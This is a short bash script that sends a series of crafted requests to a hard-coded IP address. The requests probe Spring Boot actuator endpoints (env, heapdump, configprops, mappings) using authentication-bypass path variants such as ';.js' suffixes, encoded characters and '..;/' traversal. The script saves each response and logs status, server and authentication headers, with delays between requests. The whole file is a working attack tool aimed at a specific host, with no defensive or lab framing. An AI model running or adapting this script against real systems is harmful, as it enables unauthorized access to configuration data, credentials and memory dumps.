#!/bin/bash
B="http://144.123.22.234:9080"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
paths=(
"/prod-api/actuator;.js"
"/prod-api/actuator;.js/env"
"/prod-api/actuator;.js/health"
"/prod-api/actuator;.js/heapdump"
"/prod-api/actuator;.js/configprops"
"/prod-api/actuator;.js/mappings"
"/prod-api/actuator/env;.js"
"/prod-api/actuator/env.js"
"/prod-api/actuator;.html/env"
"/prod-api/actuator;.css/env"
"/prod-api/%61ctuator;.js/env"
"/prod-api/actuator%3B.js/env"
"/prod-api/actuator/..;/actuator;.js/env"
"/prod-api/actuator"
)
n=0
for p in "${paths[@]}"; do
  n=$((n+1))
  out=$(printf "%02d" $n)
  safe=$(echo "$p" | sed 's#[/;%.:]#_#g')
  curl -s --path-as-is -m 15 -D "resp_${out}.hdr" -o "resp_${out}.body" -A "$UA" "$B$p"
  code=$(head -1 "resp_${out}.hdr" | tr -d '\r')
  wwa=$(grep -i '^www-authenticate' "resp_${out}.hdr" | tr -d '\r')
  srv=$(grep -i '^server:' "resp_${out}.hdr" | tr -d '\r')
  ct=$(grep -i '^content-type' "resp_${out}.hdr" | tr -d '\r')
  xcto=$(grep -i '^x-content-type-options' "resp_${out}.hdr" | tr -d '\r')
  len=$(wc -c < "resp_${out}.body" | tr -d ' ')
  echo "=== [$out] $p"
  echo "  $code | len=$len | $ct | $srv | $xcto | $wwa"
  echo "  body: $(head -c 400 "resp_${out}.body" | tr '\n' ' ')"
  echo "$p" > "resp_${out}.path"
  sleep 1.6
done
